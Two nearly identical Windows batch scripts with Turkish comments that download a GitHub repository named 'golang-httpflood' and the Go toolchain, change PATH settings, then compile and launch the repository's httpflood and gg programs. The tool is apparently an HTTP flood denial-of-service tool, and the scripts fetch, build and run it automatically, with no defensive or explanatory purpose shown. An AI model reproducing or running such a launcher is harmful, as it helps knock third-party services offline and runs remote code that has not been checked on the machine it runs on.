@echo off
echo == GitHub reposunu indiriliyor... ==
REM PowerShell kullanarak repositoriyi indir
powershell -Command "Invoke-WebRequest -Uri https://github.com/murmurlab/golang-httpflood/archive/refs/heads/master.zip -OutFile $env:USERPROFILE\flo.zip"

echo == İndirilen repo çıkarılıyor... ==
REM Dosyayı hedef dizine çıkar
powershell -Command "Expand-Archive -Path $env:USERPROFILE\flo.zip -DestinationPath $env:USERPROFILE\flo"

echo == Go dilini indiriliyor... ==
REM Go'yu indir
powershell -Command "Invoke-WebRequest -Uri https://go.dev/dl/go1.19.4.windows-amd64.zip -OutFile $env:USERPROFILE\gol.zip"

echo == Go dil dosyaları çıkarılıyor... ==
REM Go'yu çıkar
powershell -Command "Expand-Archive -Path $env:USERPROFILE\gol.zip -DestinationPath $env:USERPROFILE"

echo == Go binary yolu ayarlanıyor... ==
REM Go binary yolunu ayarla
setx GOPATH "%USERPROFILE%\go"
setx PATH "%PATH%;%USERPROFILE%\go\bin"

echo == Go dosyaları derleniyor... ==
REM Go dosyalarını derle
powershell -Command "$env:USERPROFILE\go\bin\go.exe build $env:USERPROFILE\flo\golang-httpflood-main\httpflood.go"
powershell -Command "$env:USERPROFILE\go\bin\go.exe build $env:USERPROFILE\flo\golang-httpflood-main\gg.go"

echo == Çıktılar çalıştırılıyor... ==
REM Çıktıları çalıştır
powershell -Command "Start-Process -FilePath $env:USERPROFILE\flo\golang-httpflood-main\httpflood.exe"
powershell -Command "Start-Process -FilePath $env:USERPROFILE\flo\golang-httpflood-main\gg.exe"

echo == İşlem tamamlandı! ==
pause


@echo off
REM PowerShell kullanarak repositoriyi indir
powershell -Command "Invoke-WebRequest -Uri https://github.com/murmurlab/golang-httpflood/archive/refs/heads/main.zip -OutFile %USERPROFILE%\flo.zip"

REM Dosyayı hedef dizine çıkar
powershell -Command "Expand-Archive -Path %USERPROFILE%\flo.zip -DestinationPath %USERPROFILE%\flo"

REM Go'yu indir
powershell -Command "Invoke-WebRequest -Uri https://go.dev/dl/go1.19.4.windows-amd64.zip -OutFile %USERPROFILE%\gol.zip"

REM Go'yu çıkar
powershell -Command "Expand-Archive -Path %USERPROFILE%\gol.zip -DestinationPath %USERPROFILE%"

REM Go binary yolunu ayarla
set GOPATH=%USERPROFILE%\go
set PATH=%PATH%;%GOPATH%\bin

REM Go dosyalarını derle
%USERPROFILE%\go\bin\go.exe build %USERPROFILE%\flo\golang-httpflood-main\httpflood.go
%USERPROFILE%\go\bin\go.exe build %USERPROFILE%\flo\golang-httpflood-main\gg.go

REM Çıktıları çalıştır
%USERPROFILE%\flo\golang-httpflood-main\httpflood.exe
%USERPROFILE%\flo\golang-httpflood-main\gg.exe

